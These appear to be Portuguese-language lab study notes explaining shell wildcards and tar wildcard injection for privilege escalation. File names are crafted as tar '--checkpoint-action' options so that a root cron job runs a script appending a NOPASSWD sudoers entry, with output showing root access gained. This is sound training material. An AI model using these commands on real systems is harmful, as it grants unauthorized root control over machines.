Um caractere curinga pode ser usado como um substituto para outros caracteres e é interpretado pelo shell antes de outras ações. Exemplos de curingas incluem:

|**Personagem**|**Significado**|
|---|---|
|`*`|Um asterisco que pode corresponder a qualquer número de caracteres em um nome de arquivo.|
|`?`|Corresponde a um único caractere.|
|`[ ]`|Os colchetes envolvem caracteres e podem corresponder a qualquer um deles na posição definida.|
|`~`|Um til no início se expande para o nome do diretório inicial do usuário ou pode ter outro nome de usuário anexado para se referir ao diretório inicial desse usuário.|
|`-`|Um hífen entre colchetes indicará um intervalo de caracteres.|

O comando ``tar`` é um exemplo de como curingas podem ser usados para escalonamento, veremos a seguir :
```bash
man tar
```
![[Pasted image 20240719174939.png]]

A opção `--checkpoint-action` permite executar comandos arbitrários ao atingir um checkpoint durante a execução de `tar`. Por exemplo, `--checkpoint=1 --checkpoint-action=exec=sh root.sh` executa `root.sh` quando o checkpoint é alcançado.

Isso pode ser usado para escalonamento de privilégios se um cron job estiver configurado para criar backups periodicamente, como no exemplo onde um cron job executa `tar` a cada minuto para compactar o conteúdo de `/home/htb-student`.

```cron-job
#
#
mh dom mon dow command
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

Podemos usar o curinga no cron job para escrever comandos. Quando for executado, interpretará o nome de arquivos como argumentos e executarão quaisquer comandos que especificarmos.

```bash
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```

Podemos verificar e ver se os arquivos necessários foram criados.

```bash
ls -la
```
|
```output
total 56
drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint=1
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
-rw-rw-r--  1 htb-student htb-student   60 Aug 31 23:11 root.sh
```

Assim que o cron job for executado novamente, poderemos verificar os privilégios sudo recém-adicionados e o sudo para root diretamente.

```bash
sudo -l
```
|
```output
Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: ALL
```






















































